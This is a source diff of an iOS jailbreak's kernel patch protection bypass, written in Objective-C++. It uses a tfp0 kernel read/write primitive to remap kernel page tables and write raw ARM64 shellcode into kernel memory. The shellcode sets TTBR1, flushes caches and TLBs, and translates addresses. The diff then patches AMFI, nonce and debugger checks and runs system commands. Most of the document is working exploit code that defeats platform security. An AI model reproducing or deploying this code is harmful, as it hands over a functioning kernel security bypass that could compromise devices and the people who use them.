@@ -47,8 +47,8 @@ extern int (*dsystem)(const char *);
 mach_port_t tfp0 = 0;
 static kptr_t kbase;
 
-void kpp(uint64_t kernbase, uint64_t slide);
-void runLaunchDaemons(void);
+static void kpp(uint64_t kernbase, uint64_t slide);
+static void runLaunchDaemons(void);
 
 static tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");
 
@@ -124,10 +124,9 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
     memset(&sp, 0, sizeof(struct sched_param));
     sp.sched_priority = MAXPRI;
     if (pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp)  == -1) {
-        printf("Failed to change priority.\n");
-        return -1;
+        LOG("Failed to change priority.\n");
     } else {
-        printf("Set pthread priority: %d\n", sp.sched_priority);
+        LOG("Set pthread priority: %d\n", sp.sched_priority);
     }
        
     
@@ -169,19 +168,30 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
     
     resume_all_threads();
     try {
-        kpp(kbase,kbase-KBASE);
+        kpp(kbase, kbase - KBASE);
     } catch (tihmstar::exception &e) {
         LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
         NSString *err = [NSString stringWithFormat:@"Error: %d",e.code()];
         postProgress(err);
     }
     
-    for (auto p : exited_processor) {
-        kern_return_t kr = processor_start(p);
-        if (kr != KERN_SUCCESS) {
-            printf("Unable to start processor %d %s\n",
-            p, mach_error_string(kr));
-            return -1;
+    for (auto &p : exited_processor) {
+        if (p == MACH_PORT_NULL) {
+            continue;
+        }
+        processor_basic_info_data_t info;
+        host_t myhost = mach_host_self();
+        natural_t infoCount = PROCESSOR_BASIC_INFO_COUNT;
+        kern_return_t ret = processor_info(p, PROCESSOR_BASIC_INFO, &myhost, (processor_info_t)&info, &infoCount);
+        if (ret == KERN_SUCCESS && !info.running) {
+            printf("Will start processor %d\n", p);
+            
+            kern_return_t kr = processor_start(p);
+            if (kr != KERN_SUCCESS) {
+                printf("Unable to start processor %d %s\n",
+                p, mach_error_string(kr));
+                return -1;
+            }
         }
     }
     
@@ -216,7 +226,7 @@ static kptr_t _RemapPage_alloc_phy(uint64_t phy_addr, size_t size) {
         uint64_t ret = physalloc(size);
         return ret;
     }
-    printf("Economize one PTE page!\n");
+    //printf("Economize one PTE page!\n");
     return 0;
 }
 
@@ -229,7 +239,7 @@ static void _RemapPage_add_page_phy(uint64_t phy_addr) {
 }
 
 static void _RemapPage_internal(kptr_t address, void (^padding_cb)(kptr_t dst, kptr_t src, int level, size_t size)) {
-    pthread_yield_np();
+    sched_yield();
     pagestuff_64(address & (~PMK), ^(vm_address_t tte_addr, int addr) {
         uint64_t tte = ReadAnywhere64(tte_addr);
         if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {
@@ -249,6 +259,9 @@ static void _RemapPage_internal(kptr_t address, void (^padding_cb)(kptr_t dst, k
             }
             uint64_t fakep_phy = findphys_real(fakep);
             TTE_SET(tte, TTE_PHYS_VALUE_MASK, fakep_phy);
+            if (fakep_phy == 0) {
+                abort();
+            }
             _RemapPage_add_page_phy(fakep_phy);
             WriteAnywhere64(tte_addr, tte);
         }
@@ -259,6 +272,9 @@ static void _RemapPage_internal(kptr_t address, void (^padding_cb)(kptr_t dst, k
         }
         padding_cb(newt, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, addr, PSZ);
         uint64_t phy_new = findphys_real(newt);
+        if (phy_new == 0) {
+            abort();
+        }
         _RemapPage_add_page_phy(phy_new);
         TTE_SET(tte, TTE_PHYS_VALUE_MASK, phy_new);
         TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);
@@ -284,7 +300,7 @@ static void RemapPageWithCB(uint64_t x, uint64_t length, void (^padding_cb)(kptr
             remappage.insert(i);
             continue;
         }
-        printf("Economize one virtual page!\n");
+        //printf("Economize one virtual page!\n");
     }
 }
 
@@ -294,7 +310,34 @@ static void RemapPage(uint64_t x, uint64_t length) {
     });
 }
 
-void kpp(uint64_t kernbase, uint64_t slide){
+struct _new_thread_context {
+    processor_t new_processor;
+    processor_t active_processor;
+    thread_t thread;
+    uint64_t *thread_buffer;
+    kptr_t thread_addr;
+};
+
+__attribute__((unused))
+static void *_new_thread(void *context) {
+    auto &c = *(struct _new_thread_context*)context;
+    thread_suspend(c.thread);
+    kern_return_t ret = processor_start(c.new_processor);
+    
+    if (ret != KERN_SUCCESS) {
+        LOG("processor_start failed: %s\n", mach_error_string(ret));
+        return (void*)-1;
+    }
+    
+    uint64_t new_processor_addr = get_address_of_port(proc_struct_addr(), c.new_processor);
+    
+    kwrite_uint64(c.thread_addr + 37 * 8, new_processor_addr);
+    thread_resume(c.thread);
+    
+    return NULL;
+}
+
+void kpp(uint64_t kernbase, uint64_t slide) {
     postProgress(@"running KPP bypass");
     checkvad();
 
@@ -302,7 +345,7 @@ void kpp(uint64_t kernbase, uint64_t slide){
 
     uint64_t gStoreBase = (uint64_t)fi.find_gPhysBase() + slide;
     uint64_t ptr2[2];
-    kread(gStoreBase, ptr2, 16);
+    kread(gStoreBase, ptr2, sizeof(ptr2));
     gPhysBase = ptr2[0];
     gVirtBase = ptr2[1];
 
@@ -338,7 +381,7 @@ void kpp(uint64_t kernbase, uint64_t slide){
      */
 
     {
-        uint32_t codes[] = { /* trampoline for idlesleep */
+        static const uint32_t codes[] = { /* trampoline for idlesleep */
             0x5800009e, //ldr x30, #0x10
             0x580000a0, //ldr x0, #0x14
             0xd61f0000  //br x0
@@ -346,7 +389,7 @@ void kpp(uint64_t kernbase, uint64_t slide){
         kwrite(shellcode + 0x100, codes, sizeof(codes));
     }
     {
-        uint32_t codes[] = { /* trampoline for deepsleep */
+        static const uint32_t codes[] = { /* trampoline for deepsleep */
             0x5800009e, //ldr x30, #0x10
             0x580000a0, //ldr x0, #0x14
             0xd61f0000  //br x0
@@ -428,19 +471,19 @@ void kpp(uint64_t kernbase, uint64_t slide){
     /*
      isvad 0 == 0x4000
      */
-
+    sched_yield();
     uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
 
-    uint64_t ttbr0_real = fi.find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler - slide + idx*4 + 24), 1) + slide;
-    uint64_t ttbr0 = ReadAnywhere64(ttbr0_real);
-    NSLog(@"ttbr0: %llx %llx", ttbr0, ttbr0_real);
+    uint64_t ttbr1_real = fi.find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler - slide + idx*4 + 24), 1) + slide;
+    uint64_t ttbr1 = ReadAnywhere64(ttbr1_real);
+    NSLog(@"ttbr1: %llx %llx", ttbr1, ttbr1_real);
     
-    kernel_bcopy(ttbr0 - gPhysBase + gVirtBase, level0_pte, isvad == 0 ? 0x4000 : 0x1000);
+    kwrite_uint32(level0_pte, 0); // Writing makes page from virtual to physical.
 
     uint64_t physp = findphys_real(level0_pte);
 
     {
-        uint32_t codes[] = {
+        static const uint32_t codes[] = {
             0x5800019e, // ldr x30, #40
             0xd518203e, // msr ttbr1_el1, x30
             0xd508871f, // tlbi vmalle1
@@ -461,7 +504,7 @@ void kpp(uint64_t kernbase, uint64_t slide){
 
     shc+=0x100;
     {
-        uint32_t codes[] = {
+        static const uint32_t codes[] = {
             0x5800019e, // ldr x30, #40
             0xd518203e, // msr ttbr1_el1, x30
             0xd508871f, // tlbi vmalle1
@@ -481,7 +524,7 @@ void kpp(uint64_t kernbase, uint64_t slide){
     }
     shc-=0x100;
     {
-        uint32_t codes[] = {
+        static const uint32_t codes[] = {
             0x18000148, // ldr    w8, 0x28
             0xb90002e8, // str        w8, [x23]
             0xaa1f03e0, // mov     x0, xzr
@@ -502,10 +545,13 @@ void kpp(uint64_t kernbase, uint64_t slide){
 
     mach_vm_address_t kppsh = 0;
     mach_vm_allocate(tfp0, &kppsh, isvad ? 0x1000 : 0x4000, VM_FLAGS_ANYWHERE);
+    uint64_t flush_all_cache_addr;
+    uint64_t flush_tlb_addr;
+    uint64_t address_translation_addr;
+    uint64_t set_ttbr1_addr;
     {
-        //uint64_t ttbr0 = ReadAnywhere64(ttbr0_real);
         uint32_t codes[] = {
-            0x580001e1, // ldr    x1, #60
+            0x580001A1, // ldr    x1, #52
             0x58000140, // ldr    x0, #40
             0xd5182020, // msr    TTBR1_EL1, x0
             0xd2a00600, // movz    x0, #0x30, lsl #16
@@ -516,15 +562,108 @@ void kpp(uint64_t kernbase, uint64_t slide){
             isvad ? 0xd508871f : 0xd508873e, // tlbi vmalle1 (4k) / tlbi    vae1, x30 (16k)
             0xd5033fdf, // isb
             0xd65f03c0, // ret
-            (uint32_t)ttbr0,
-            (uint32_t)(ttbr0 >> 32),
-            (uint32_t)physp,
-            (uint32_t)(physp >> 32),
+            (uint32_t)ttbr1,
+            (uint32_t)(ttbr1 >> 32),
             (uint32_t)physp,
             (uint32_t)(physp >> 32)
         };
+        
+        auto cache = get_cache_data();
+        uint32_t flush_icache_PoC[] = {
+            0xD53B4222, // mrs x2, DAIF
+            0xD50343DF, // msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF)
+            0xd508711f, // ic ialluis
+            0xD5033F9F, // dsb sy
+            0xD5033FDF, // isb sy
+            0xd2800000, // mov x0, #0
+            0x18000309, //ldr w9, data1  96    0
+            0x1800030a, //ldr w10, data2 96   1
+            0x1800030b, //ldr w11, data3 96  2
+            0xD5087E40, //dc cisw, x0        3
+            0x8b090000, //add x0, x0, x9    4
+            0xea0a001f, //tst x0, x10     5
+            0x54FFFFA0, //b.eq dc -12          6
+            0x8A2A0000, //bic x0, x0, x10   7
+            0xAB0B0000, //adds x0, x0, x11  8
+            0x54FFFF43, //b.cc dc -24          9
+            0xD2800040, //mov x0, #2        10
+            0x18000209, //mov w9, data4 64    11
+            0x1800020a, //mov w10, data5,   12
+            0x1800020b, //mov w11, data6    13
+            0xD5087E40, //dc cisw, x0        14
+            0x8b090000, //add x0, x0, x9    15
+            0xea0a001f, //tst x0, x10     16
+            0x54FFFFA0, //b.eq dc -12            17
+            0x8A2A0000, //bic x0, x0, x10   18
+            0xAB0B0000, //adds x0, x0, x11  19
+            0x54FFFF43, //b.cc dc -24          20
+            0xD5033F9F, //dsb sy            21
+            0xD51B4222, // msr DAIF, x2 22
+            0xd65f03c0, // ret  23
+            1u << cache.mmu_i7set,
+            1u << (cache.mmu_nset + cache.mmu_i7set),
+            1u << cache.mmu_i7way,
+            1u << cache.l2_i7set,
+            1u << (cache.l2_nset + cache.l2_i7set),
+            1u << cache.l2_i7way,
+        };
+        
+        static const uint32_t address_translation[] = {
+            0xD53B4222, // mrs x2, DAIF
+            0xD50343DF, // msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF)
+            0xD5087800, // at s1e1r, x0
+            0xD5387401, // mrs x1, PAR_EL1
+            0xD51B4222, // msr DAIF, x2
+            0x3707FFE1, // tbnz x1, #0, L_invalid
+            0xB3402C01, // bfm x1, x0, #0, #11
+            0x9240BC20, // and x0, x1, #0x0000ffffffffffff
+            0xD65F03C0, // ret
+            0xAA1F03E0, // mov x0, xzr
+            0xD65F03C0, // ret
+        };
+        
+        uint32_t flush_tlb[] = {
+            0xD53B4222, // mrs x2, DAIF
+            0xD50343DF, // msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF)
+            0xD5033F9F, // dsb sy 4
+            0xd5033fdf, // isb 5
+            0xD508871F, // tlbi vmalle1 6
+            0xD5033F9F, // dsb sy 7
+            0xd5033fdf, // isb 8
+            0xD51B4222, // msr DAIF, x2 9
+            0xd65f03c0, // ret 10
+        };
+        uint32_t set_ttbr1[] = {
+            0xD53B4222, // mrs x2, DAIF
+            0xD50343DF, // msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF)
+            0xd5182020, // msr    TTBR1_EL1, x0
+            0xD51B4222, // msr DAIF, x2
+            0xd65f03c0, // ret
+        };
+        
         kwrite(kppsh, codes, sizeof(codes));
+        
+        flush_all_cache_addr = kppsh + sizeof(codes);
+        kwrite(flush_all_cache_addr, flush_icache_PoC, sizeof(flush_icache_PoC));
+        
+        address_translation_addr = flush_all_cache_addr + sizeof(flush_icache_PoC);
+        kwrite(address_translation_addr, address_translation, sizeof(address_translation));
+        
+        flush_tlb_addr = address_translation_addr + sizeof(address_translation);
+        kwrite(flush_tlb_addr, flush_tlb, sizeof(flush_tlb));
+        
+        set_ttbr1_addr = flush_tlb_addr + sizeof(flush_tlb);
+        kwrite(set_ttbr1_addr, set_ttbr1, sizeof(set_ttbr1));
     }
+    auto flush_all_cache_kfunc = ^{
+        kexec(flush_all_cache_addr, 0, 0, 0, 0, 0, 0, 0);
+    };
+    auto flush_tlb_kfunc = ^{
+        kexec(flush_tlb_addr, 0, 0, 0, 0, 0, 0, 0);
+    };
+    auto set_ttbr1_kfunc = ^(uint64_t ttbr1) {
+        kexec(set_ttbr1_addr, ttbr1, ttbr1, 0, 0, 0, 0, 0);
+    };
 
     mach_vm_protect(tfp0, kppsh, isvad ? 0x1000 : 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
 
@@ -539,12 +678,12 @@ void kpp(uint64_t kernbase, uint64_t slide){
      pagetables are now not real anymore, they're real af
 
      */
-
-    uint64_t cpacr_addr = (uint64_t)fi.find_cpacr_write() + slide;
-
+    
+    sched_yield();
+    kernel_bcopy(ttbr1 - gPhysBase + gVirtBase, level0_pte, isvad == 0 ? 0x4000 : 0x1000);
     level1_table = physp - gPhysBase + gVirtBase;
     WriteAnywhere64(pmap_addr, level1_table);
-    kexec(kppsh, 0, 0, 0, 0, 0, 0, 0);
+    uint64_t cpacr_addr = (uint64_t)fi.find_cpacr_write() + slide;
 
     uint64_t shtramp = kernbase + ((const struct mach_header *)fi.kdata())->sizeofcmds + sizeof(struct mach_header_64);
     RemapPage(cpacr_addr, 4);
@@ -587,17 +726,10 @@ void kpp(uint64_t kernbase, uint64_t slide){
     kernelpatches.push_back(fi.find_amfi_substrate_patch());
     kernelpatches.push_back(fi.find_nonceEnabler_patch());
 
-    try {
-        //kernelpatches.push_back(fi->find_sandbox_patch());
-    } catch (tihmstar::exception &e) {
-        NSLog(@"WARNING: failed to find sandbox_patch! Assuming we're on x<10.3 and continueing anyways!");
-    }
-
-
     auto dopatch = [&](tihmstar::patchfinder64::patch &patch){
         patch.slide(slide);
         NSString * str = @"patching at: %p [";
-        for (int i=0; i<patch._patchSize; i++) {
+        for (int i = 0; i<patch._patchSize; i++) {
             str = [NSString stringWithFormat:@"%@%02x",str,*((uint8_t*)patch._patch+i)];
         }
         NSLog([str stringByAppendingString:@"]"],patch._location);
@@ -683,23 +815,47 @@ void kpp(uint64_t kernbase, uint64_t slide){
     buf = nullptr;
     postProgress(@"setting Marijuan");
     
-    uint64_t marijuanoff = (uint64_t)fi.find_release_arm()+slide;
+    uint64_t marijuanoff = (uint64_t)fi.find_release_arm() + slide;
 
     // smoke trees
     const char Marijuan[] = {'M', 'a', 'r', 'i', 'j', 'u', 'a', 'n'};
     RemapPage(marijuanoff, sizeof(Marijuan));
     WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)Marijuan);
+    set_ttbr1_kfunc(physp);
+    flush_all_cache_kfunc();
+    flush_tlb_kfunc();
     
     postProgress(@"i_can_has_debugger?");
-
+    
+//    {
+//        uint64_t thread_addr = get_address_of_port(proc_struct_addr(), mach_thread_self());
+//        //uint64_t *buffer = (uint64_t*)malloc(0x4a0); //iOS 10.3.3 struct thread size is 0x4B8
+//        //kread(thread_addr, buffer, 0x4A0);
+//        pthread_t p;
+//        struct _new_thread_context c = {
+//            new_proc, active_proc, mach_thread_self(), nullptr, thread_addr
+//        };
+//        pthread_create(&p, nullptr, _new_thread, (void*)&c);
+//        void *ret;
+//        pthread_join(p, &ret);
+//        if (ret != nullptr) {
+//            postProgress(@"Failed to switch context");
+//            return;
+//        }
+//        new_proc = MACH_PORT_NULL;
+//    }
     //check for i_can_has_debugger
     uint32_t i_can_has_debugger;
     auto ichd_patch = fi.find_i_can_has_debugger_patch_off();
+    uint64_t phyaddr = kexec(address_translation_addr, (uint64_t)ichd_patch._location + slide, 0, 0, 0, 0, 0, 0);
+    NSLog(@"i_can_has_debugger phy: %llx %llx\n", phyaddr, findphys_real((uint64_t)ichd_patch._location + slide));
     while ((i_can_has_debugger = ReadAnywhere32((uint64_t)ichd_patch._location + slide)) != 1) {
         //kwrite(NewPointer((uint64_t)ichd_patch._location + slide), ichd_patch._patch, ichd_patch._patchSize);
-        printf("i_can_has_debugger %d\n", i_can_has_debugger);
+        //printf("i_can_has_debugger %d %d\n", i_can_has_debugger, ReadAnywhere32(NewPointer((uint64_t)ichd_patch._location + slide)));
         sleep(1);
     }
+    phyaddr = kexec(address_translation_addr, (uint64_t)ichd_patch._location + slide, 0, 0, 0, 0, 0, 0);
+    NSLog(@"i_can_has_debugger phy: %llx %llx\n", phyaddr, findphys_real((uint64_t)ichd_patch._location + slide));
     
     postProgress(@"remounting rootfs");
     
@@ -907,7 +1063,7 @@ void runLaunchDaemons(void){
     //ssh workaround
     dsystem("launchctl unload /Library/LaunchDaemons/com.openssh.sshd.plist;/usr/libexec/sshd-keygen-wrapper");
 
-    pthread_yield_np();
+    sched_yield();
     if (douicache) {
         postProgress(@"running uicache");
         dsystem("(bash -c \"su -c uicache mobile;killall backboardd;\")&");
@@ -928,7 +1084,7 @@ extern "C" mach_port_t sock_port_get_tfp0(kptr_t *kbase, offsets_t *off);
 extern "C" int jailbreak_system(const char *command) {
     return _jailbreak_with_cb([=](task_t tfp0_, kptr_t kbase, void *data) {
         resume_all_threads();
-        pthread_yield_np();
+        sched_yield();
         dsystem(command);
         return KERN_SUCCESS;
     });
